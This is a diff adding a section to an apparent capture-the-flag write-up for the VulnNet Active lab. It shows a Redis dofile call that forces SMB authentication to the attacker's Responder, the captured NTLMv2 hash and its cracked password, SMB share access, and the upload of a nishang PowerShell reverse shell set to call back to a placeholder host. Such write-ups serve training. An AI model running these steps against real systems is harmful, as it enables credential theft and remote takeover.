@@ -298,7 +298,116 @@ vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\
 
 <br>
 
+<h2>reponder</h2>
+
+```bash
+:~/VulnNetActive# responder -I ens5
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+...
+[+] Listening for events...
+```
+
+<h2>Redis</h2>
+
+```bash
+vulnnet.thm:6379> eval "dofile('//10.201.73.53/share')" 0
+(error) ERR Error running script (call to f_32380ab635d6cb342773862d8d86a17e07226ad8): @user_script:1: cannot open //10.201.73.53/share: Permission denied 
+```
+
+<h2>Responder</h2>
+
+```bash
+[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:010100000000000000F81DAD5815DC011C9C79CBCAB219E0000000000200080034004E005600510001001E00570049004E002D0047003500490047004A003200470034004C004E00330004003400570049004E002D0047003500490047004A003200470034004C004E0033002E0034004E00560051002E004C004F00430041004C000300140034004E00560051002E004C004F00430041004C000500140034004E00560051002E004C004F00430041004C000700080000F81DAD5815DC010600040002000000080030003000000000000000000000000030000046B2BA4B3F219184389733CCEF7D9876E0997C0921B6D126A0BEF7D02109F9290A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300031002E00370033002E00350033000000000000000000
+```
+
+<img width="1164" height="196" alt="image" src="https://github.com/user-attachments/assets/905024d2-c94d-4bda-b2a5-cb536979e4a6" />
+
+<h3>Hash</h3>
+
+```bash
+:~/VulnNetActive# cat hash
+enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:010100000000000000F81DAD5815DC011C9C79CBCAB219E0000000000200080034004E005600510001001E00570049004E002D0047003500490047004A003200470034004C004E00330004003400570049004E002D0047003500490047004A003200470034004C004E0033002E0034004E00560051002E004C004F00430041004C000300140034004E00560051002E004C004F00430041004C000500140034004E00560051002E004C004F00430041004C000700080000F81DAD5815DC010600040002000000080030003000000000000000000000000030000046B2BA4B3F219184389733CCEF7D9876E0997C0921B6D126A0BEF7D02109F9290A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300031002E00370033002E00350033000000000000000000
+```
+
+<h2>John the Ripper</h2>
+<p>
+
+-  enterprise-security : sand_0873959498</p>
+
+```bash
+:~/VulnNetActive# john hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+<img width="1166" height="296" alt="image" src="https://github.com/user-attachments/assets/2673e1bc-b32f-45e0-8457-bb74486177a0" />
+
+<h2>smbclient</h2>
+<p>
+
+- Enterprise-Share</p>
+
+```bash
+:~/VulnNetActive# smbclient -L vulnnet.thm -U enterprise-security
+```
+
+<img width="1173" height="265" alt="image" src="https://github.com/user-attachments/assets/06e388b5-f725-4fe4-bc58-3c7289e57860" />
 
 <br>
+<br>
+
+```bash
+:~/VulnNetActive# smbclient \\\\vulnnet.thm\\Enterprise-Share -U enterprise-security
+```
+
+<img width="1166" height="237" alt="image" src="https://github.com/user-attachments/assets/f86c9743-4732-4f0f-87f4-55adfbd85e48" />
+
+<h2>Reverse Shell</h2>
+
+
+<p>
+
+- download <code>https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1</code><br>
+- add <code>Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx</code> to <code>Invoke-PowerShellTcp.ps1</code></p>
+
+
+```bash
+:~/VulnNetActive# curl https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1 -o Invoke-PowershellTcp.ps1
+```
+
+```bash
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx
+```
+
+```bash
+smb: \> put Invoke-PowerShellTcp.ps1
+
+```
+
+
+
+
+
+
+
 
 
